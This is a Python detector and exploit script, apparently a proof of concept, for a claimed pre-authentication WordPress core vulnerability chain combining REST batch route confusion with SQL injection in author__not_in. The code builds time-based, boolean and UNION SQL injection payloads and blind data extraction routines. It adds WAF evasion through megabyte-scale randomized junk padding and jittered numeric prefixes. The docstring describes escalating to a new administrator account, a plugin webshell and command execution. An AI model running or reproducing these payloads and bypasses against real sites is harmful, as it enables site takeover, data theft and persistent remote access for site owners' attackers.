#!/usr/bin/env python3
"""
wp2shell_check.py — detector & pre-auth RCE PoC for wp2shell
=============================================================
CVE-2026-63030 (REST /batch/v1 route confusion) + CVE-2026-60137
(WP_Query::author__not_in SQL injection) in WordPress core 6.9.0-6.9.4 / 7.0.0-7.0.1.

What it does
------------
**Detect (default):** Confirms the *unauthenticated SQL injection*, automatically, with
fallback on two independent axes so a single blocked path never yields a false negative:

  * **oracle** (`--method auto`): a fast **boolean row-count differential** (flip the injected
    WHERE true `1=1` vs false `1=12`, watch the confused posts query's row count collapse — no
    SLEEP) first; if it doesn't fire, the original **time-based SLEEP** differential.
  * **delivery** (`--delivery auto`): a **JSON** POST to the batch route first; if that isn't
    processed (e.g. an edge blocks `/wp-json`), a **`rest_route=/batch/v1` multipart form on
    `POST /`** (the exact operator request shape).

Each strategy is tried until one *confirms*; only when all come up empty is a target reported
negative. Override with `--method boolean|time` / `--delivery json|multipart` (`--multipart` is
an alias). Reads no data and changes nothing. `--proof` reads two harmless scalars (@@version,
current_user()) as evidence — still read-only.

**Exploit (`-c COMMAND`):** Full pre-auth RCE on stock WordPress — no FILE privilege, no
object cache, no plugins, no misconfigurations required. The chain:
  1. Blind SQLi confirms vulnerability and extracts table prefix / admin ID
  2. UNION row forgery via per_page=-1 split_the_query bypass injects fake posts
  3. oEmbed cache seeding turns read-only SQLi into real DB writes
  4. Changeset elevation + re-entrant parse_request runs in admin context
  5. POST /wp/v2/users creates a new administrator
  6. Login → plugin webshell upload → command execution (reused across runs)

The created admin and deployed webshell are cached per target (~/.wp2shell/state.json),
so repeat `-c` runs skip the whole chain and issue a single request to the live shell.
--fresh forces the full chain; --cleanup makes the shell delete itself and clears the cache.

The stock-default RCE mechanism (oEmbed → changeset → re-entry) was researched by
Mustafa Can İPEKÇİ (nukedx), building on the route confusion + SQLi discovered by
Adam Kues (Assetnote / Searchlight Cyber).

Authorized use only
-------------------
Run this against systems you own or are explicitly authorized to test. Remote (non-loopback)
targets require --authorized.

Usage
-----
    python3 wp2shell_check.py http://target[:port]           # detect (auto oracle + delivery)
    python3 wp2shell_check.py http://target --method time    # force the SLEEP oracle
    python3 wp2shell_check.py http://target --delivery multipart  # force rest_route form on /
    python3 wp2shell_check.py http://target --proof          # + read @@version as evidence
    python3 wp2shell_check.py http://target -c "id"          # full pre-auth RCE (caches admin+shell)
    python3 wp2shell_check.py http://target -c "whoami"      # reuses the cached shell (single request)
    python3 wp2shell_check.py http://target -c "id" --multipart  # RCE batch over rest_route forms
    python3 wp2shell_check.py http://target --cleanup        # remove the deployed shell + forget state
    python3 wp2shell_check.py -f hosts.txt --authorized --json
    python3 wp2shell_check.py http://127.0.0.1:8093          # local lab (no --authorized needed)

Status values:
  vulnerable        - actively confirmed via the injection (batch confusion, 6.9.0-7.0.1)
  affected_version  - fingerprinted version is in an affected range but the active check did
                      not fire (e.g. 6.8.0-6.8.5 has the SQLi sink but not the 6.9+ confusion
                      delivery; or a WAF/edge blocked the probe). Version-based, not proof.
  not_vulnerable    - active check negative and version outside the affected ranges

Exit codes: 0 = needs attention (vulnerable or affected_version), 1 = not vulnerable, 2 = error.
Follows redirects while preserving the POST body; ignores TLS errors (curl -k).
"""
import argparse
import base64
import concurrent.futures
import gzip
import hashlib
import html as html_mod
import http.client
import io
import json
import os
import re
import secrets
import ssl
import statistics
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
import zlib
from collections import Counter
from http.cookiejar import CookieJar

__version__ = "2.2.1"


class _KeepPost(urllib.request.HTTPRedirectHandler):
    """Follow redirects but PRESERVE the POST method and body. urllib's default handler
    downgrades a redirected POST to a bodyless GET (301/302/303), which would silently
    drop the batch payload when a site redirects http->https or to a canonical host and
    produce a false negative. We keep POSTing to the Location instead. Loop protection
    (max_redirections) is still enforced by the parent."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        if req.get_method() == "POST" and code in (301, 302, 303, 307, 308):
            hdrs = {k: v for k, v in req.header_items() if k.lower() != "content-length"}
            return urllib.request.Request(newurl, data=req.data, headers=hdrs,
                                          origin_req_host=req.origin_req_host,
                                          unverifiable=True, method="POST")
        return super().redirect_request(req, fp, code, msg, headers, newurl)


class Target:
    def __init__(self, base, timeout=15, proxy=None, sleep=4.0, route="auto", delivery="auto",
                 headers=None, cookies="", bypass=False):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.sleep = float(sleep)
        self.route = route
        # extra headers (list of (name, value)) added to every request via opener.addheaders
        self.extra_headers = list(headers or [])
        # delivery: "auto" (probe JSON, fall back to multipart if JSON isn't processed),
        # "json" (POST body to /wp-json|rest_route batch), or "multipart" (rest_route form on /).
        self.delivery = delivery
        self.multipart = (delivery == "multipart")  # current on-the-wire delivery for _send()
        self._delivery_resolved = (delivery != "auto")
        self.union = False       # when set, read_scalar/read_int extract via UNION reflection
        self._proxy = proxy
        self.batch = None        # resolved endpoint URL (canonical, post-redirect)
        self._mp_ep = None       # resolved multipart endpoint (root vs /index.php)
        self._base = 0.0         # measured baseline round-trip (set by detect(); used by the oracle)
        self._normalized = False # whether the base host/scheme has been canonicalized
        # -- bypass (request pumping technique) --
        self.cookies = cookies   # CF clearance cookies string (cf_clearance=...; __cf_bm=...; ...)
        self.bypass = bypass     # low-level http.client pump path (Chrome 149 headers)
        # Ignore TLS verification (self-signed / expired / hostname-mismatch certs are
        # common on test targets). Equivalent to `curl -k`.
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        self._ssl_ctx = ctx      # reused by _lowlevel
        opener_handlers = [urllib.request.HTTPSHandler(context=ctx), _KeepPost()]
        if proxy:
            opener_handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        else:
            opener_handlers.append(urllib.request.ProxyHandler({}))  # ignore env proxies
        self.opener = urllib.request.build_opener(*opener_handlers)
        # Strip urllib's default Python-urllib User-Agent so the user controls
        # UA entirely via -H. If no -H "User-Agent:" is passed, no UA is sent.
        self.opener.addheaders = [(n, v) for n, v in self.opener.addheaders
                                  if n.lower() != "user-agent"]
        self.opener.addheaders += self.extra_headers

    # ---- low-level http.client bypass request --------------------------------
    # Uses putrequest/putheader for precise header control. Only sends what
    # the user provides via -H + Cookie (--cookies) + Content-Type + Content-Length.
    # No hardcoded UA or fingerprint headers.
    @staticmethod
    def _decode_resp(data, encoding):
        """Decompress gzip / deflate response bodies."""
        if encoding == "gzip":
            try:
                return gzip.decompress(data)
            except Exception:
                return data
        if encoding == "deflate":
            try:
                return zlib.decompress(data)
            except Exception:
                return data
        return data

    def _lowlevel(self, url, data=None, headers=None, method=None, timeout=None):
        """http.client request for bypass mode. Only sends what the user
        provides via -H (extra_headers) + Cookie + Content-Type + Content-Length.
        No hardcoded UA or fingerprint headers — the user supplies those.
        Returns (status, elapsed, body_bytes, final_url) — same shape as _raw()."""
        parsed = urllib.parse.urlparse(url)
        use_tls = (parsed.scheme == "https")
        host = parsed.hostname or "localhost"
        port = parsed.port or (443 if use_tls else 80)
        default_port = (443 if use_tls else 80)
        hostport = ("%s:%d" % (host, port)) if port != default_port else host
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        tout = timeout or self.timeout
        if use_tls:
            if self._proxy:
                pp = urllib.parse.urlparse(self._proxy if "://" in self._proxy
                                           else "http://" + self._proxy)
                conn = http.client.HTTPSConnection(
                    pp.hostname, pp.port, context=self._ssl_ctx, timeout=tout)
                conn.set_tunnel(hostport)
            else:
                conn = http.client.HTTPSConnection(
                    hostport, context=self._ssl_ctx, timeout=tout)
        else:
            if self._proxy:
                pp = urllib.parse.urlparse(self._proxy if "://" in self._proxy
                                           else "http://" + self._proxy)
                conn = http.client.HTTPConnection(pp.hostname, pp.port, timeout=tout)
                path = url  # absolute URI for plain-HTTP proxy
            else:
                conn = http.client.HTTPConnection(hostport, timeout=tout)

        verb = method or ("POST" if data else "GET")
        conn.putrequest(verb, path, skip_host=True, skip_accept_encoding=True)
        conn.putheader("Host", hostport)

        # Cookie (if set via --cookies)
        if self.cookies:
            conn.putheader("Cookie", self.cookies)

        # User-supplied -H headers (including User-Agent, Sec-Ch-Ua, etc.)
        for name, value in self.extra_headers:
            conn.putheader(name, value)

        # Content-Type (from the caller's headers dict)
        ct_value = None
        if headers:
            items = headers.items() if isinstance(headers, dict) else headers
            for k, v in items:
                if k.lower() == "content-type":
                    ct_value = v
                    break
        if ct_value:
            conn.putheader("Content-Type", ct_value)

        # Content-Length + send
        if data:
            conn.putheader("Content-Length", str(len(data)))
        conn.endheaders(data)

        t0 = time.perf_counter()
        resp = conn.getresponse()
        raw = resp.read()
        elapsed = time.perf_counter() - t0

        body = self._decode_resp(raw, resp.getheader("Content-Encoding", ""))
        conn.close()
        return resp.status, elapsed, body, url

    def _normalize_base(self):
        """Follow redirects on the root once and pin the canonical scheme://host, so the
        batch POST goes straight to the final host (http->https, apex->www, etc.) instead
        of relying on a redirect for every probe. Only scheme+host are taken (never a
        redirected path), so REST routes stay correct."""
        if self._normalized:
            return
        self._normalized = True
        try:
            req = urllib.request.Request(self.base + "/", headers={})
            with self.opener.open(req, timeout=self.timeout) as r:
                u = urllib.parse.urlparse(r.geturl())
                if u.scheme and u.netloc:
                    canon = "%s://%s" % (u.scheme, u.netloc)
                    if canon != self.base:
                        self.base = canon
                        self.batch = None  # re-resolve endpoint against the canonical host
        except Exception:
            pass

    # -- HTTP ---------------------------------------------------------------
    def _raw(self, url, data=None, headers=None, method=None):
        # When bypass is active (cookies set or --bypass flag), use the low-level
        # http.client path for precise header ordering + double-CT support.
        if self.cookies or self.bypass:
            return self._lowlevel(url, data=data, headers=headers, method=method)
        hdrs = dict(headers or {})

        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.perf_counter()
        try:
            with self.opener.open(req, timeout=self.timeout) as r:
                body = r.read()
                return r.status, time.perf_counter() - t0, body, r.geturl()
        except urllib.error.HTTPError as e:
            return e.code, time.perf_counter() - t0, e.read(), getattr(e, "url", url)

    def _endpoints(self):
        if self.route == "wp-json":
            return [self.base + "/wp-json/batch/v1"]
        if self.route == "rest-route":
            return [self.base + "/?rest_route=/batch/v1"]
        # auto: rest_route works without pretty permalinks; wp-json needs them
        return [self.base + "/?rest_route=/batch/v1", self.base + "/wp-json/batch/v1"]

    # -- payload ------------------------------------------------------------
    # The injected value breaks out of `post_author NOT IN ( <value> )` and wraps SLEEP
    # in a derived table:  (SELECT 1 FROM (SELECT SLEEP(n))x)  -- so MySQL materializes
    # and evaluates it once, independent of the number of rows the posts query returns.
    # A bare `NOT IN (SELECT SLEEP(n))` / `OR SLEEP(n)` gets optimized away and never
    # executes on some managed WordPress hosts, which reads as a false negative. The
    # nested subquery avoids that.
    @staticmethod
    def _envelope(author_exclude):
        """Nested batch (route confusion) that lands `author_exclude` in WP_Query::author__not_in."""
        enc = urllib.parse.quote(author_exclude, safe="")
        inner = {"requests": [
            {"method": "POST", "path": "///"},                            # misalignment trigger
            {"method": "GET",  "path": "/wp/v2/users?author_exclude=" + enc},
            {"method": "GET",  "path": "/wp/v2/posts"},                   # supplies get_items handler
        ]}
        return {"requests": [
            {"method": "POST", "path": "/v2/categories", "body": {"name": "x"}},
            {"method": "POST", "path": "///", "body": {"name": "x"}},
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},    # self-call onto batch handler
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    # -- JSON junk padding (request pumping technique) ------------
    # Wrap the batch envelope in a JSON dict with ~1MB of leading junk keys
    # and trailing junk so the WAF's bounded body inspection window never
    # reaches the real `requests` array. The structure mirrors final.json:
    #   0_frontpad (1MB), 400+ mixed-pattern junk keys (some 0_<lc><digit>,
    #   some pure-random 512-char keys, some nested dicts), then rest_route /
    #   validation / requests / padding / _junk0 / _junk1 (nested dict), then
    #   more trailing junk keys. Everything is randomized per-request so
    #   there's no fixed signature the WAF can pin.
    _FRONTPAD_LEN = 1_000_000      # base leading junk string length (jittered per-request)
    _JUNK_KEY_COUNT = 400           # leading junk keys before the real data
    _TRAILING_JUNK = 10             # trailing junk keys after the data
    _PADDING_LEN = 65_536          # base trailing padding length (jittered)

    @staticmethod
    def _rand_junk(n):
        """Random alphanumeric string of length n (a-zA-Z0-9)."""
        import secrets as _s, string as _st
        alphabet = _st.ascii_letters + _st.digits
        return "".join(_s.choice(alphabet) for _ in range(n))

    @staticmethod
    def _rand_lc(n):
        """Random lowercase string of length n."""
        import secrets as _s, string as _st
        return "".join(_s.choice(_st.ascii_lowercase) for _ in range(n))

    @staticmethod
    def _rand_key_name():
        """Random junk key name — varies the pattern to avoid signature detection.
        Patterns are chosen randomly to mirror final.json's mixed key styles:
          - '0_<8 lowercase><digit>'   (e.g. 0_aflazsqc0)
          - pure random alphanumeric 48-64 chars (no prefix)
          - '<8 lowercase>'            (bare word)
          - random length 8-16 alnum   (short mixed)
        """
        import secrets as _s
        style = _s.choice(["0_lc", "pure_long", "bare_word", "short_mixed"])
        if style == "0_lc":
            return "0_" + Target._rand_lc(8) + str(_s.choice(range(10)))
        elif style == "pure_long":
            return Target._rand_junk(_s.choice([48, 56, 64]))
        elif style == "bare_word":
            return Target._rand_lc(_s.choice(range(8, 17)))
        else:
            return Target._rand_junk(_s.choice(range(8, 17)))

    @staticmethod
    def _rand_nested_junk(depth=2):
        """A small nested dict of random junk (mirrors final.json's 0_nest / _junk1).
        Recurses up to <depth> levels, each level has 3-8 random keys mapping to
        random junk strings or deeper dicts."""
        import secrets as _s
        out = {}
        for _ in range(_s.choice([3, 5, 8])):
            if depth > 0 and _s.choice([False, True]):
                out[Target._rand_key_name()] = Target._rand_nested_junk(depth - 1)
            else:
                out[Target._rand_key_name()] = Target._rand_junk(_s.choice([64, 128, 256]))
        return out

    def _pump_envelope(self, envelope):
        """Wrap <envelope> in a junk-padded JSON structure (request pumping technique).

        Every key name and every value is randomized per-request so there is no
        fixed signature the WAF can pin. The real batch (rest_route + validation
        + requests) is buried deep inside a ~2MB dict. The leading 1MB frontpad
        + 400 mixed-pattern junk keys push past the WAF's body inspection window;
        trailing padding + nested junk + more junk keys pad the tail.

        The real `rest_route` / `validation` / `requests` keys are the only ones
        with fixed names — WordPress needs them to route the batch. Everything
        else gets a random name.
        """
        import secrets as _s
        out = {}
        # 1. Leading ~1MB frontpad (random key name, jittered length)
        fpad = self._FRONTPAD_LEN + _s.choice(range(-8192, 8193))
        out[self._rand_key_name()] = self._rand_junk(fpad)
        # 2. Hundreds of junk keys with random names, random lengths, some
        #    pure-random 512-char values, some nested dicts.
        for _ in range(self._JUNK_KEY_COUNT):
            key = self._rand_key_name()
            if _s.choice([False, False, True]):  # ~1/3 are nested dicts
                out[key] = self._rand_nested_junk()
            elif _s.choice([False, False, True]):  # ~1/3 are 512-char pure-random
                out[key] = self._rand_junk(512)
            else:                                   # ~1/3 are 256/1024/4096
                out[key] = self._rand_junk(_s.choice([256, 1024, 4096]))
        # 3. A nested junk dict (random key name)
        out[self._rand_key_name()] = self._rand_nested_junk()
        # 4. A big junk string (random key name, ~20KB)
        out[self._rand_key_name()] = self._rand_junk(20000)
        # 5. The real batch data — only these keys have fixed names (WP needs them)
        out["rest_route"] = "/batch/v1?" + self._rand_junk(200)
        out["validation"] = "normal"
        out["requests"] = envelope["requests"]
        # 6. Trailing junk — all random key names, jittered lengths
        padlen = self._PADDING_LEN + _s.choice(range(-4096, 4097))
        out[self._rand_key_name()] = self._rand_junk(padlen)
        out[self._rand_key_name()] = self._rand_junk(32768 + _s.choice(range(-2048, 2049)))
        out[self._rand_key_name()] = {self._rand_key_name(): self._rand_junk(4000)
                                      for _ in range(12)}
        for _ in range(self._TRAILING_JUNK):
            out[self._rand_key_name()] = self._rand_junk(4096)
        return out

    # -- multipart (rest_route form) delivery -------------------------------
    # WordPress reads the public query var `rest_route` from $_POST in WP::parse_request(),
    # so the whole nested batch can ride as multipart form fields on POST / — no JSON, no
    # /wp-json path. This is the exact shape of the observed operator request and slips past
    # edges that filter JSON bodies to /wp-json/batch/v1.
    @staticmethod
    def _flatten_fields(envelope):
        """Flatten the nested batch envelope into ordered PHP-array form fields, e.g.
        requests[0][method], requests[2][body][requests][1][path]. Order is preserved,
        which the desync depends on."""
        fields = []

        def rec(name, val):
            if isinstance(val, dict):
                for k, v in val.items():
                    rec("%s[%s]" % (name, k), v)
            elif isinstance(val, list):
                for i, v in enumerate(val):
                    rec("%s[%d]" % (name, i), v)
            else:
                fields.append((name, "" if val is None else str(val)))

        for i, req in enumerate(envelope["requests"]):
            rec("requests[%d]" % i, req)
        return fields

    @staticmethod
    def _multipart_encode(fields):
        boundary = "----WebKitFormBoundary%s" % secrets.token_hex(8)
        out = []
        for name, value in fields:
            out.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                        % (boundary, name, value)).encode())
        out.append(("--%s--\r\n" % boundary).encode())
        return "multipart/form-data; boundary=%s" % boundary, b"".join(out)

    # -- multipart junk padding (--bypass + --multipart) --------------------
    # Same idea as _pump_envelope but for multipart/form-data: prepend
    # hundreds of random junk form fields (1MB+ of leading junk) so the WAF's
    # bounded body inspection never reaches the real rest_route / validation /
    # requests[*] fields. Mirrors final.json's structure but as flattened form
    # fields instead of JSON keys.
    _MP_FRONTPAD_FIELDS = 300       # leading junk fields
    _MP_FRONTPAD_LEN = 4096         # each leading junk field value length
    _MP_TRAILING_FIELDS = 10        # trailing junk fields after the real data
    _MP_TRAILING_LEN = 4096

    def _pump_multipart_fields(self, real_fields):
        """Prepend + append random junk form fields around <real_fields> so
        the WAF never inspects the real rest_route / requests[*] fields.
        Returns a flat list of (name, value) pairs ready for _multipart_encode."""
        import secrets as _s
        fields = []
        # 1. Leading junk fields — random names, 4KB random values each (~1.2MB)
        for _ in range(self._MP_FRONTPAD_FIELDS):
            fields.append((self._rand_key_name(), self._rand_junk(self._MP_FRONTPAD_LEN)))
        # 2. The real fields (rest_route, validation, requests[*], ...)
        fields.extend(real_fields)
        # 3. Trailing junk fields
        for _ in range(self._MP_TRAILING_FIELDS):
            fields.append((self._rand_key_name(), self._rand_junk(self._MP_TRAILING_LEN)))
        return fields

    def _send(self, author_exclude):
        """Deliver one injection carrying <author_exclude> into author__not_in.
        Returns (status, elapsed, body_bytes). Honors self.multipart."""
        self._normalize_base()
        env = self._envelope(author_exclude)
        if self.multipart:
            fields = [("rest_route", "/batch/v1"), ("validation", "normal")]
            fields += self._flatten_fields(env)
            if self.bypass:
                fields = self._pump_multipart_fields(fields)
            ctype, body = self._multipart_encode(fields)
            hdrs = {"Content-Type": ctype}
            if self._mp_ep is None:
                for ep in (self.base + "/", self.base + "/index.php"):
                    st, el, resp, _ = self._raw(ep, data=body, headers=hdrs, method="POST")
                    if st in (200, 207):
                        self._mp_ep = ep
                        return st, el, resp
                self._mp_ep = self.base + "/"  # nothing processed; keep root, timing/rows decide
            st, el, resp, _ = self._raw(self._mp_ep, data=body, headers=hdrs, method="POST")
            return st, el, resp
        # JSON delivery (default)
        if self.bypass:
            # request pumping technique: wrap the batch in a ~2.7MB junk-padded
            # JSON body and POST to /?rest_route=/batch/v1 so WP routes it via
            # the query var while the WAF never inspects the real requests.
            pumped = self._pump_envelope(env)
            body = json.dumps(pumped).encode()
            headers = {"Content-Type": "application/json"}
            ep = self.base + "/?rest_route=/batch/v1"
            st, el, resp, _ = self._raw(ep, data=body, headers=headers, method="POST")
            return st, el, resp
        body = json.dumps(env).encode()
        headers = {"Content-Type": "application/json"}
        if self.batch is None:
            # resolve which endpoint form the site accepts (a processed batch answers 207/200);
            # pin the post-redirect URL so later probes hit the canonical endpoint directly.
            for ep in self._endpoints():
                st, _, _, final = self._raw(ep, data=body, headers=headers, method="POST")
                if st in (200, 207):
                    self.batch = final
                    break
            if self.batch is None:
                self.batch = self._endpoints()[0]  # fall back; timing still decides
        st, el, resp, _ = self._raw(self.batch, data=body, headers=headers, method="POST")
        return st, el, resp

    def probe(self, author_exclude):
        """Send one injection into author__not_in. Returns (status, elapsed)."""
        st, el, _ = self._send(author_exclude)
        return st, el

    # WAF bypass: prepend a long junk integer as the leading IN() operand, right before
    # the injection breakout — the observed shape is `<junk> AND sleep(n)`. The digits
    # ride ahead of the SQL keywords, so signature/keyword scanners that only inspect a
    # bounded prefix of the value never reach the SLEEP/OR. Alternating 1/0 blocks keep
    # it a plain numeric literal that survives charset normalization.
    # NOTE: MySQL caps a bare numeric literal at 65 significant digits (DECIMAL); a pad
    # this long only slips past the WAF if the backend casts the oversize literal to
    # DOUBLE (non-strict mode) instead of erroring. Tune _PAD_LEN for the target.
    _PAD_LEN = 133333        # base junk-integer length
    _PAD_JITTER = 4096       # per-request length varies by +/- up to this, so the pad
                             # isn't a fixed-length signature the WAF can pin on.

    @classmethod
    def _pad(cls):
        """A leading junk integer of jittered length (~_PAD_LEN +/- _PAD_JITTER)."""
        n = cls._PAD_LEN
        if cls._PAD_JITTER:
            n += secrets.randbelow(2 * cls._PAD_JITTER + 1) - cls._PAD_JITTER
        n = max(1, n)
        return (("1" * 8 + "0" * 8) * (n // 16 + 1))[:n]

    @classmethod
    def _sleep_payload(cls, seconds):
        return "%s) OR (SELECT 1 FROM (SELECT SLEEP(%g))x)-- -" % (cls._pad(), seconds)

    # -- detection ----------------------------------------------------------
    def detect(self, rounds=3):
        fast = statistics.median(self.probe(self._sleep_payload(0))[1] for _ in range(rounds))
        slow = statistics.median(self.probe(self._sleep_payload(self.sleep))[1] for _ in range(rounds))
        self._base = fast
        delta = slow - fast
        # vulnerable if the slow path tracks our injected sleep and the fast path did not
        vulnerable = delta >= (self.sleep * 0.6) and fast < (self.sleep * 0.5)
        return {"fast": fast, "slow": slow, "delta": delta, "vulnerable": vulnerable}

    # -- boolean (row-count) detection -------------------------------------
    # No SLEEP: flip the injected WHERE true (1=1) vs false (1=12) and read the confused
    # posts query's row count. True -> rows returned (the `-- -` also truncates the
    # status/pagination clauses, so X-WP-Total climbs); false -> zero rows. A stable
    # true>0 / false==0 differential is the injection firing. Faster than timing and
    # immune to SLEEP being filtered or optimized away on managed hosts.
    @classmethod
    def _bool_payload(cls, truth):
        return "%s) AND 1=%d-- -" % (cls._pad(), 1 if truth else 12)

    @staticmethod
    def _harvest(body):
        """Walk a (possibly nested) batch response; return (max X-WP-Total seen or None,
        count of post-like objects) across every sub-response. Robust to desync index shifts."""
        try:
            doc = json.loads(body)
        except Exception:
            return None, 0
        totals, posts = [], [0]

        def walk(o):
            if isinstance(o, dict):
                h = o.get("headers")
                if isinstance(h, dict) and "X-WP-Total" in h:
                    try:
                        totals.append(int(h["X-WP-Total"]))
                    except (TypeError, ValueError):
                        pass
                for v in o.values():
                    walk(v)
            elif isinstance(o, list):
                if o and all(isinstance(e, dict) for e in o) and any(
                        "id" in e and ("title" in e or "content" in e or "slug" in e) for e in o):
                    posts[0] += sum(1 for e in o if "id" in e)
                for e in o:
                    walk(e)

        walk(doc)
        return (max(totals) if totals else None), posts[0]

    @staticmethod
    def _has_responses(body):
        """True if <body> parses as a processed batch (a 'responses' array anywhere).
        Distinguishes 'delivery reached the batch handler' from 'blocked / not WordPress'."""
        try:
            doc = json.loads(body)
        except Exception:
            return False

        def walk(o):
            if isinstance(o, dict):
                if isinstance(o.get("responses"), list):
                    return True
                return any(walk(v) for v in o.values())
            if isinstance(o, list):
                return any(walk(e) for e in o)
            return False

        return walk(doc)

    def detect_boolean(self):
        """Row-count differential. Returns a dict incl. {'vulnerable': bool, 'processed': bool}.
        'processed' means the current delivery reached the batch handler (so a negative is a
        real negative, not a blocked delivery that the caller should retry another way)."""
        try:
            _, _, tb = self._send(self._bool_payload(True))
            _, _, fb = self._send(self._bool_payload(False))
        except urllib.error.URLError:
            return {"vulnerable": False, "processed": False, "signal": "none",
                    "true_total": None, "false_total": None,
                    "true_posts": 0, "false_posts": 0, "true_len": 0, "false_len": 0}
        t_total, t_posts = self._harvest(tb)
        f_total, f_posts = self._harvest(fb)
        by_total = (t_total is not None and f_total is not None and t_total > 0 and f_total == 0)
        by_posts = (t_posts > 0 and f_posts == 0)
        by_len = ((len(tb) - len(fb)) > 200 and f_posts == 0 and t_posts > 0)
        signal = ("x-wp-total" if by_total else "post-count" if by_posts
                  else "body-length" if by_len else "none")
        processed = self._has_responses(tb) or self._has_responses(fb)
        return {"vulnerable": bool(by_total or by_posts or by_len), "processed": processed,
                "signal": signal, "true_total": t_total, "false_total": f_total,
                "true_posts": t_posts, "false_posts": f_posts,
                "true_len": len(tb), "false_len": len(fb)}

    # -- delivery resolution + method orchestration ------------------------
    def _set_delivery(self, name):
        self.multipart = (name == "multipart")

    def _delivery_name(self):
        return "multipart" if self.multipart else "json"

    def _batch_processes(self):
        """Cheap benign probe: does the *current* delivery reach the batch handler?"""
        try:
            st, _, body = self._send("0")
        except urllib.error.URLError:
            return False
        return st in (200, 207) and self._has_responses(body)

    def _resolve_delivery(self):
        """For delivery=auto, pin JSON if it reaches the batch handler, else multipart.
        Used by the RCE/proof paths that call detect()/oracle directly."""
        if self._delivery_resolved:
            return
        self._delivery_resolved = True
        self._set_delivery("json")
        if self._batch_processes():
            return
        self._set_delivery("multipart")
        if self._batch_processes():
            return
        self._set_delivery("json")  # neither processed; timing/rows will read negative anyway

    def _union_confirms(self):
        """True if a random token reflects back through the UNION sink (sets self.union).
        The token is fresh each call so there's no fixed probe string on the wire."""
        tok = secrets.token_hex(4)
        try:
            ok = self._union_read("SELECT 0x%s" % tok.encode().hex()) == tok
        except urllib.error.URLError:
            ok = False
        self.union = ok
        return ok

    def detect_auto(self, method="auto", rounds=3):
        """Automatic detection with fallback across both axes:
          method:   union (reflect data directly) -> boolean (row-count) -> time (SLEEP)
          delivery: json  ->  multipart (rest_route form), when json isn't processed
        auto prefers union (single request, real data) and falls back to the blind oracles
        when reflection is blocked. Tries each until one CONFIRMS; returns the confirming
        (method, delivery). Only when all configured strategies come up empty is it negative."""
        deliveries = ["json", "multipart"] if self.delivery == "auto" else [self.delivery]
        boo_by_delivery = {}

        # 0) union reflection first (auto or forced): one request, yields real data
        if method in ("auto", "union"):
            for d in deliveries:
                self._set_delivery(d)
                if self._union_confirms():
                    return {"vulnerable": True, "method": "union", "delivery": d, "time": None}
            self.union = False
            if method == "union":                       # forced union: no blind fallback
                neg = deliveries[0] if deliveries else self._delivery_name()
                self._set_delivery(neg)
                return {"vulnerable": False, "method": "union", "delivery": neg, "time": None}

        # 1) boolean oracle across deliveries (each is cheap: 2 requests)
        if method in ("auto", "boolean"):
            for d in deliveries:
                self._set_delivery(d)
                boo = self.detect_boolean()
                boo_by_delivery[d] = boo
                if boo["vulnerable"]:
                    return {"vulnerable": True, "method": "boolean", "delivery": d, "boolean": boo}

        # 2) time oracle. Run it once, on a delivery already proven to reach the batch handler
        #    (avoids paying the SLEEP cost twice); fall back to the first candidate otherwise.
        last_time = None
        if method in ("auto", "time"):
            proc = [d for d in deliveries if boo_by_delivery.get(d, {}).get("processed")]
            for d in (proc[:1] or deliveries[:1]):
                self._set_delivery(d)
                det = self.detect(rounds=rounds)
                last_time = (d, det)
                if det["vulnerable"]:
                    return {"vulnerable": True, "method": "time", "delivery": d, "time": det}

        # nothing confirmed
        neg_delivery = (last_time[0] if last_time else
                        (deliveries[0] if deliveries else self._delivery_name()))
        self._set_delivery(neg_delivery)
        return {"vulnerable": False, "method": None, "delivery": neg_delivery,
                "boolean": boo_by_delivery, "time": (last_time[1] if last_time else None)}

    # -- bounded read-only proof -------------------------------------------
    def _oracle(self, cond, unit=0.6):
        payload = "%s) OR (SELECT 1 FROM (SELECT IF((%s),SLEEP(%g),0))x)-- -" % (self._pad(), cond, unit)
        _, el = self.probe(payload)
        return el > (self._base + unit * 0.6)   # relative to measured baseline (latency-safe)

    def read_scalar(self, expr, maxlen=40, unit=0.6):
        if self.union:
            v = self._union_read(expr)
            return v if v is not None else ""
        v = "COALESCE((%s),'')" % expr
        lo, hi = 0, maxlen
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("CHAR_LENGTH(%s)>=%d" % (v, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        out = ""
        for pos in range(1, lo + 1):
            a, b = 32, 126
            while a < b:
                mid = (a + b + 1) // 2
                if self._oracle("ASCII(SUBSTRING(%s,%d,1))>=%d" % (v, pos, mid), unit):
                    a = mid
                else:
                    b = mid - 1
            out += chr(a)
        return out

    def read_int(self, query, unit=0.6):
        if self.union:
            v = self._union_read(query)
            try:
                return int(v)
            except (TypeError, ValueError):
                return 0
        expr = "COALESCE((%s),0)" % query
        lo, hi = 0, 1
        while self._oracle("%s >= %d" % (expr, hi), unit):
            lo, hi = hi, hi * 2
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("%s >= %d" % (expr, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        return lo

    # -- UNION-based extraction (single request per value) -------------------
    # A 23-column UNION forges one wp_posts row whose post_content carries the target
    # expression; the route confusion delivers it past REST arg validation and per_page
    # >=500 keeps WP_Query on the single-query path so the columns align and the posts
    # controller serializes our row. We wrap the value in a random marker so it survives
    # the_content filters (wpautop/wptexturize) and can be sliced back out of the response.
    # Much faster than the blind boolean/time oracle: one HTTP round-trip per value.
    def _union_row(self, content_expr, title_expr="0x78"):
        """23-column wp_posts row with a raw SQL expression in post_content (col 5)."""
        h = self._hex
        return ",".join((
            "1", "1",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"),
            content_expr, title_expr, "''",
            h("publish"), h("closed"), h("closed"), "''",
            h("x"), "''", "''",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"), "''",
            "0", "''", "0",
            h("post"), "''", "0",
        ))

